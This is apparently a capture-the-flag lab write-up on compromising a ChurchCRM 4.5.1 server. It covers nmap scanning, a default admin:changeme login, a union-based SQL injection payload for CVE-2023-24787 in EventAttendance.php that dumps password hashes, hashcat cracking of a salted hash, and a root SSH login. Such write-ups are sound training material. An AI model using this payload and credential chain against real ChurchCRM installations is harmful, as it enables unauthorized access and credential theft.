Groove

Target IP: 192.168.160.44
Challenge Description: N/A.

Reconnaissance


There are two TCP ports open on the target machine: SSH and HTTP, as shown in the image above. Running a TCP port scan using the command sudo nmap -sS 192.168.160.44 -p- returns this result.


Performing an aggressive TCP port scan using the command sudo nmap -sV -A 192.168.160.44 -p 22,80 returns the result shown in the image above. The target machine is running OpenSSH 8.4p1 Debian 5+deb11u1 SSH application on port 22. Then on port 80, it is running Apache httpd 2.4.56. The web application's title is ChurchCRM. Time to check it out.

Enumeration

Port 80: HTTP

The webpage shown in the picture above is returned for this web application on port 80. The web application name is ChurchCRM. I notice it informs me to login. There is no register button, where I can create an account. Doing a Google search for ChurchCRM default credentials, I came across this website. I notice the default credentials are admin:changeme.


Using the default credentials admin:changeme, I gained access to the web application as shown in the picture above. Now I have administrator privileges over the web application.


I browsed to the Admin section and then clicked on the Debug button. This contains the installation, system, and database information as shown in the picture above. It seems like the target machine is running ChurchCRM 4.5.1. The web application root is at /var/www/html. Time to enumerate further.


After some further enumeration, I didn't find anything useful on the web application. I did a Google search for ChurchCRM vulnerabilities and came across the website shown in the picture above. It looks like the web application is vulnerable to SQL Injection. I have the authentication admin:changeme. The exploit contains the following information:

The endpoint /EventAttendance.php is vulnerable to Authenticated SQL Injection (Union-based and Blind-based) via the Event GET parameter.
This endpoint can be triggered through the following menu: Events - Event Attendance Reports - Church Service/Sunday School. 
The Event Parameter is taken directly from the query string and passed into the SQL query without any sanitization or input escaping.
This allows the attacker to inject malicious Event payloads to execute the malicious SQL query.

This script is created as Proof of Concept to retrieve the username and password hash from user_usr table.
The endpoint /EventAttendance.php is vulnerable to Authenticated SQL Injection (Union-based and Blind-based) via the Event GET parameter.
This endpoint can be triggered through the following menu: Events - Event Attendance Reports - Church Service/Sunday School. 
The Event Parameter is taken directly from the query string and passed into the SQL query without any sanitization or input escaping.
This allows the attacker to inject malicious Event payloads to execute the malicious SQL query.

This script is created as Proof of Concept to retrieve the username and password hash from user_usr table.

Exploitation & Flag

Owning the ChurchCRM via SQL Injection (CVE-2023-24787) & Obtaining Foothold as root
For the exploit to work, I will need to complete a few steps. To achieve this, I followed the steps Events - Event Attendance Reports - Church Service/Sunday School and created a test event as shown in the picture below:

The Church Service event I created is an example to test the SQL Injection PoC. As mentioned in the exploit description, the page /EventAttendance.php is vulnerable to SQL Injection using the parameter Event. I fired up burpsuite on my machine. Time to test this parameter. This vulnerability is Blind SQL Injection, therefore the web application will not produce any output such as error messages.


Using burpsuite, I intercepted a request to the EventAttendance.php page. Then inside the Event parameter, I passed in the value sleep(5). This caused the application to hang for five seconds. This proves the application is vulnerable to Blind SQL Injection. The exploit contains the following PoC that outputs the contents of the database:

2+UNION+ALL+SELECT+1,NULL,CONCAT('Perseverance',usr_Username,':',usr_Password),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+from+user_usr--+-
2+UNION+ALL+SELECT+1,NULL,CONCAT('Perseverance',usr_Username,':',usr_Password),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+from+user_usr--+-


Running the PoC by making a request using the following http://192.168.160.44/EventAttendance.php?Action=List&Event=1+UNION+ALL+SELECT+1,NULL,CONCAT(%27Perseverance--%3E%27,usr_Username,%27:%27,usr_Password),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+from+user_usr--+&Type=Church%20Service returns the output shown in the image above. Now I have two hashed password credentials:

Admin:4bdf3fba58c956fc3991a1fde84929223f968e2853de596e49ae80a91499609b
root:33b8fc76a24681b67a9431b632548d069336202bed5828fe431711a8e5b52d1b
Admin:4bdf3fba58c956fc3991a1fde84929223f968e2853de596e49ae80a91499609b
root:33b8fc76a24681b67a9431b632548d069336202bed5828fe431711a8e5b52d1b

Obviously the first first belongs to the user Admin. Their password is changeme. However, I find this entry root:33b8fc76a24681b67a9431b632548d069336202bed5828fe431711a8e5b52d1b interesting. Is this the root user? I attempted to crack it using crackstation, but I had no luck. I hit a brick wall.


When checking the hash type implemented by ChurchCRM, I came across the Github issue shown in the picture above. This can be viewed here. It seems like the password hashing algorithm is simple. The salt of the hash is the user ID. And the hashing algorithm is SHA256. Since the second user in the database is this user, I will need to add the 2 after the hash. Now my password hash becomes the following:

33b8fc76a24681b67a9431b632548d069336202bed5828fe431711a8e5b52d1b:2
33b8fc76a24681b67a9431b632548d069336202bed5828fe431711a8e5b52d1b:2

To crack the SHA252 hash, I used the mode 1410 offered by hashcat:

And bingo! Now I have the password artistakeichelleko2007 belonging to the user root.


Then I connected to the target machine via SSH using the command ssh root@192.168.160.44 and the password artistakeichelleko2007. Now I have a root SSH foothold on the target machine, as shown in the image above :)


There is only one flag on the machine: proof.txt, as shown in the image above.
